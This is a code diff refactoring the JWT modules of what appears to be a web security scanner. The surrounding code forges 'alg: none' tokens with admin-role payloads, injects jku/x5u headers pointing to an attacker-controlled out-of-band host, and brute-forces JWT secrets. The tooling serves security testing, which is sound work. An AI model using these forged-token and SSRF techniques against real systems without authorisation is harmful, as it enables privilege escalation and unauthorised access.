@@ -7,7 +7,13 @@ import time as _time
 import hmac
 import hashlib
 from typing import Dict, List, Optional
+from urllib.parse import urljoin, urlparse, urlunparse
 from .base import BaseScanner
+
+try:
+    from websecure.core.payloads import load_external_payloads as _load_ext_payloads
+except ImportError:
+    _load_ext_payloads = None  # type: ignore[assignment]
 
 logger = logging.getLogger(__name__)
 
@@ -102,7 +108,6 @@ class JWTScanner(BaseScanner):
         return candidates
 
     def _build_protected_urls(self, base_url: str) -> List[str]:
-        from urllib.parse import urlparse, urlunparse
         parsed = urlparse(base_url)
         base = urlunparse((parsed.scheme, parsed.netloc, "", "", "", ""))
         urls = [base_url]
@@ -194,13 +199,10 @@ class JWTScanner(BaseScanner):
             return 0
 
         candidates: List[str] = []
-        try:
-            from websecure.core.payloads import load_external_payloads
-            ext = load_external_payloads("jwt_secrets")
+        if _load_ext_payloads is not None:
+            ext = _load_ext_payloads("jwt_secrets")
             if ext:
                 candidates.extend(ext)
-        except ImportError:
-            pass
 
         if not candidates:
             candidates = [
@@ -270,7 +272,6 @@ class JWTScanner(BaseScanner):
         """Attempt to retrieve RSA public key bytes from JWKS endpoints."""
         keys: List[bytes] = []
         try:
-            from urllib.parse import urlparse, urlunparse
             parsed = urlparse(url)
             base = urlunparse((parsed.scheme, parsed.netloc, "", "", "", ""))
             jwks_paths = [
@@ -673,12 +674,13 @@ class JWTAlgNoneBypass(BaseScanner):
 
         test_endpoints = kwargs.get("endpoints") or ["/api/me", "/api/admin", "/dashboard", "/api/profile"]
 
+        def _enc(d):
+            return base64.urlsafe_b64encode(
+                json.dumps(d, separators=(",", ":")).encode()
+            ).decode().rstrip("=")
+
         for alg_variant in self._ALG_NONE_VARIANTS:
             forged_header  = {**header, "alg": alg_variant}
-            def _enc(d):
-                return base64.urlsafe_b64encode(
-                    json.dumps(d, separators=(",", ":")).encode()
-                ).decode().rstrip("=")
             h_enc = _enc(forged_header)
             p_enc = _enc({**payload, "role": "admin", "is_admin": True})
             # Try with empty sig and no sig
@@ -799,13 +801,15 @@ class JWTJKUSSRFProber(BaseScanner):
             return results
 
         evil_jwks = oob_url or f"https://{_OOB_HOST}/jwks.json"
+
+        def _enc(d):
+            return base64.urlsafe_b64encode(
+                json.dumps(d, separators=(",", ":")).encode()
+            ).decode().rstrip("=")
+
         # Inject jku / x5u pointing to our controlled server
         for hdr_key in ("jku", "x5u", "jwks_uri"):
             forged_header = {**header, hdr_key: evil_jwks, "alg": "RS256"}
-            def _enc(d):
-                return base64.urlsafe_b64encode(
-                    json.dumps(d, separators=(",", ":")).encode()
-                ).decode().rstrip("=")
             # Sign with empty (server will try to fetch jku)
             forged = f"{_enc(forged_header)}.{_enc(payload)}."
 
@@ -850,7 +854,6 @@ class JWTAdim6Scanner(BaseScanner):
         ]
         for sc in sub_scanners:
             try:
-                sc.target = target
                 res = sc.run(target, token=token, **kwargs)
                 all_results.extend(res)
             except Exception as exc:
